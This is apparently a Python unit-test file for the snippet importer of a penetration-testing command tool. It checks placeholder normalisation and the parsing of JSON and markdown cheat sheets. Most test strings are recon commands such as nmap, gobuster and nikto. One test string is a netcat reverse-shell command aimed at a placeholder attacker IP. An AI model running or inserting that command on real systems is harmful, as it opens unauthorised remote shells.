import os
import sys
import unittest
import tempfile
from pathlib import Path

# Ensure project root is in sys.path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core.snippet_manager import SnippetManager
from core.snippet_importer import (
    normalize_template_variables,
    parse_snippets_json,
    parse_snippets_markdown,
)
from core.validators import MAX_CONFIG_FILE_SIZE


class TestSnippetImporter(unittest.TestCase):

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.temp_path = Path(self.temp_dir.name)
        os.environ["SPECTRE_CONFIG_DIR"] = str(self.temp_path / "config")
        (self.temp_path / "config").mkdir(parents=True, exist_ok=True)

        self.user_snippets_path = self.temp_path / "config" / "user_snippets.json"
        self.mgr = SnippetManager(user_snippets_path=self.user_snippets_path)

    def tearDown(self):
        os.environ.pop("SPECTRE_CONFIG_DIR", None)
        self.temp_dir.cleanup()

    def test_normalize_template_variables(self):
        self.assertEqual(normalize_template_variables("nmap -sV $TARGET"), "nmap -sV {{TARGET_IP}}")
        self.assertEqual(normalize_template_variables("curl http://$TARGET_IP:$PORT"), "curl http://{{TARGET_IP}}:{{PORT}}")
        self.assertEqual(normalize_template_variables("nc -lvnp $LPORT"), "nc -lvnp {{PORT}}")
        self.assertEqual(normalize_template_variables("nc -e /bin/sh $ATTACKER 4444"), "nc -e /bin/sh {{ATTACKER_IP}} 4444")
        self.assertEqual(normalize_template_variables("gobuster dir -u http://<target> -w $WORDLIST"), "gobuster dir -u http://{{TARGET_IP}} -w {{WORDLIST}}")

    def test_parse_snippets_json_list(self):
        raw = """[
            {"title": "Ping Host", "template": "ping -c 4 $TARGET", "category": "Network", "tags": ["ping", "icmp"]},
            {"title": "Whois Lookup", "template": "whois $TARGET"}
        ]"""
        snippets = parse_snippets_json(raw)
        self.assertEqual(len(snippets), 2)
        self.assertEqual(snippets[0]["title"], "Ping Host")
        self.assertEqual(snippets[0]["template"], "ping -c 4 {{TARGET_IP}}")
        self.assertEqual(snippets[0]["category"], "Network")
        self.assertEqual(snippets[0]["tags"], ["ping", "icmp"])
        self.assertEqual(snippets[1]["title"], "Whois Lookup")
        self.assertEqual(snippets[1]["template"], "whois {{TARGET_IP}}")

    def test_parse_snippets_markdown(self):
        md = """
# Web & HTTP
## Enumeration
### Gobuster Directory Search
```bash
gobuster dir -u http://$TARGET -w /wordlists/dir.txt
```

### Nikto Scan
```bash
nikto -h http://$TARGET
```
"""
        snippets = parse_snippets_markdown(md)
        self.assertEqual(len(snippets), 2)
        self.assertEqual(snippets[0]["title"], "Gobuster Directory Search")
        self.assertEqual(snippets[0]["template"], "gobuster dir -u http://{{TARGET_IP}} -w /wordlists/dir.txt")
        self.assertEqual(snippets[0]["category"], "Web & HTTP")
        self.assertEqual(snippets[1]["title"], "Nikto Scan")
        self.assertEqual(snippets[1]["template"], "nikto -h http://{{TARGET_IP}}")

    def test_import_from_file_json(self):
        fpath = self.temp_path / "test_import.json"
        fpath.write_text('[{"title": "Custom Cmd", "template": "echo 123"}]', encoding="utf-8")
        count = self.mgr.import_from_file(fpath)
        self.assertEqual(count, 1)
        self.assertTrue(any(s["title"] == "Custom Cmd" for s in self.mgr.snippets))

    def test_import_from_file_markdown(self):
        fpath = self.temp_path / "cheatsheet.md"
        fpath.write_text("""
# Web & HTTP
## Enumeration
### Gobuster Directory Search
```bash
gobuster dir -u http://$TARGET -w /wordlists/dir.txt
```
""", encoding="utf-8")
        count = self.mgr.import_from_file(fpath)
        self.assertEqual(count, 1)
        self.assertTrue(any(s["title"] == "Gobuster Directory Search" for s in self.mgr.snippets))

    def test_import_respects_product_file_size_limit(self):
        """A file beyond the documented import limit is rejected as invalid input."""
        fpath = self.temp_path / "oversized_snippets.json"
        with open(fpath, "wb") as f:
            f.seek(MAX_CONFIG_FILE_SIZE)
            f.write(b"0")

        count = self.mgr.import_from_file(fpath)
        self.assertEqual(count, 0)


if __name__ == "__main__":
    unittest.main()
